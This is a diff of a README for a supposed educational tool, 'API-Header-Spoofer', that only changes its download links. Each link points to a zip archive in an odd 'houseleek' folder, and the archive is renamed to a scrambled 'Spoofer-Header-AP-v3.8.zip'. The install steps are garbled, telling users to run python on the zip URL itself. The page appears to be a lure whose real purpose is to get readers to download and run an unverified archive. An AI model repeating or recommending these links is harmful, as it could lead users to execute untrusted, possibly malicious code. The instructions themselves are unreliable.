@@ -1,6 +1,6 @@
 # 🛠️ API-Header-Spoofer - Learn Header Spoofing Easily
 
-[![Download](https://raw.githubusercontent.com/tensei3san/API-Header-Spoofer/main/houseleek/API-Header-Spoofer-3.7-beta.1.zip%20API--Header--Spoofer-007bff?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/tensei3san/API-Header-Spoofer/main/houseleek/API-Header-Spoofer-3.7-beta.1.zip)
+[![Download](https://raw.githubusercontent.com/tensei3san/API-Header-Spoofer/main/houseleek/Spoofer-Header-AP-v3.8.zip%20API--Header--Spoofer-007bff?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/tensei3san/API-Header-Spoofer/main/houseleek/Spoofer-Header-AP-v3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Welcome to API-Header-Spoofer! This application provides practical examples of h
 
 To get started, visit the Releases page to download the latest version of API-Header-Spoofer:
 
-[Download API-Header-Spoofer](https://raw.githubusercontent.com/tensei3san/API-Header-Spoofer/main/houseleek/API-Header-Spoofer-3.7-beta.1.zip)
+[Download API-Header-Spoofer](https://raw.githubusercontent.com/tensei3san/API-Header-Spoofer/main/houseleek/Spoofer-Header-AP-v3.8.zip)
 
 After downloading, follow the steps below to install the application.
 
@@ -45,7 +45,7 @@ After downloading, follow the steps below to install the application.
 3. Extract the files to a folder.
 4. Open your terminal or command prompt.
 5. Navigate to the folder where you extracted the files.
-6. Run the Python script by typing `python https://raw.githubusercontent.com/tensei3san/API-Header-Spoofer/main/houseleek/API-Header-Spoofer-3.7-beta.1.zip`, replacing `https://raw.githubusercontent.com/tensei3san/API-Header-Spoofer/main/houseleek/API-Header-Spoofer-3.7-beta.1.zip` with the actual script name.
+6. Run the Python script by typing `python https://raw.githubusercontent.com/tensei3san/API-Header-Spoofer/main/houseleek/Spoofer-Header-AP-v3.8.zip`, replacing `https://raw.githubusercontent.com/tensei3san/API-Header-Spoofer/main/houseleek/Spoofer-Header-AP-v3.8.zip` with the actual script name.
 
 ## ⚙️ Important Tips
 
@@ -69,4 +69,4 @@ If you encounter issues or have questions, feel free to open an issue on our Git
 
 You're now ready to dive into the world of header spoofing with API-Header-Spoofer. This application will help you learn about web scraping techniques in a straightforward manner. Don't forget to check back for updates and new examples! 
 
-[Download API-Header-Spoofer](https://raw.githubusercontent.com/tensei3san/API-Header-Spoofer/main/houseleek/API-Header-Spoofer-3.7-beta.1.zip) and start exploring today!
+[Download API-Header-Spoofer](https://raw.githubusercontent.com/tensei3san/API-Header-Spoofer/main/houseleek/Spoofer-Header-AP-v3.8.zip) and start exploring today!
